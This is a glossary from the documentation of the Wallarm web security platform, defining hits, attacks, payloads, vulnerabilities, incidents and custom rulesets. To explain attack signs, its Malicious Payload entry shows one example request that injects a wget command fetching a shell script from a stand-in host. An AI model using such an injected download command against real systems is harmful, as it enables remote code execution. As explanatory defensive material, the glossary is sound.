# Glossary

The glossary covers the core Wallarm entities to provide you with a better understanding of the platform.

## Hit

A hit is a serialized malicious request (original malicious request and metadata added by the filtering node), e.g.:

![Hit example](images/user-guides/events/analyze-attack-raw.png)

[Details on hit parameters](user-guides/events/check-attack.md#attack-analysis_1)

## Attack

An attack is a single hit or multiple hits [grouped](user-guides/events/grouping-sampling.md#grouping-of-hits).

An example of an attack including a single hit:

![Attack with one hit](images/glossary/attack-with-one-hit-example.png)

An example of an attack including many hits:

![Attack with several hits](images/glossary/attack-with-several-hits-example.png)

See [details](user-guides/events/check-attack.md) on how to understand and analyze attacks.

## Malicious Payload

A part of an original request containing the following elements:

* Attack signs detected in a request. If several attack signs characterizing the same attack type are detected in a request, only the first sign will be recorded to a payload.
* Context of the attack sign. Context is a set of symbols preceding and closing detected attack signs. Since a payload length is limited, the context can be omitted if an attack sign is of full payload length.

For example:

* Request:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Malicious payload:

    ```bash
    ;wget+http://s
    ```

    In this payload, `;wget+` is the [RCE](attacks-vulns-list.md#remote-code-execution-rce) attack sign and another part of the payload is the attack sign context.

Since attack signs are not used to detect [behavioral attacks](attacks-vulns-list.md#attack-types), requests sent as a part of behavioral attacks have empty payloads.

## Vulnerability

A vulnerability is an error made due to negligence or inadequate information when building or implementing an API that can lead to an information security risk.

The information security risks are:

* Unauthorized data access; for example, access to read and modify user data.
* Denial of service.
* Data corruption and other.

The Internet traffic can be used to detect the vulnerabilities, which is what Wallarm does, among other functions.

## Security Incident

A security incident is an occurrence of vulnerability exploitation. An incident is an [attack](#attack) targeted at a confirmed vulnerability.

An incident, just like an attack, is an entity external to your system and is a characteristic of the outside Internet, not the system itself. Despite the fact that the attacks targeted at existing vulnerabilities are a minority, they are of the utmost importance in terms of information security. Wallarm automatically detects the attacks targeted at existing vulnerabilities and displays them as a separate object - incident.

See also: [Incident Analysis](user-guides/events/check-incident.md)

## Circular Buffer
A circular buffer is a data structure that uses a single, fixed‑size buffer as if it were connected end‑to‑end.
[See Wikipedia](https://en.wikipedia.org/wiki/Circular_buffer).

## Custom ruleset (the former term is LOM)

A custom ruleset is a set of compiled security rules downloaded by Wallarm nodes from the Wallarm Cloud.

Custom rules enable you to set up individual rules for the traffic processing, e.g.:

* Mask sensitive data before uploading to the Wallarm Cloud
* Create regexp-based attack indicators
* Apply a virtual patch blocking requests that exploit an active vulnerability
* Disable attack detection in certain requests, etc.

A custom ruleset is not empty by default, it contains the rules created for all clients registered in the Cloud, e.g. the filtration mode rule with the value from the [**Settings → General** tab](admin-en/configure-wallarm-mode.md#general-filtration-mode).

[More details on custom rulesets](user-guides/rules/rules.md)

## Invalid Request
A request that was checked by filter node and does not match LOM rules.

## Reverse Proxy
A reverse proxy is a type of proxy server that retrieves resources on behalf of a client from a server and returns the resources to the client as if they originated from the Web server itself.
[See Wikipedia](https://en.wikipedia.org/wiki/Reverse_proxy).

## Certificate Authority
A certificate authority is an entity that issues digital certificates.
[See Wikipedia](https://en.wikipedia.org/wiki/Certificate_authority).
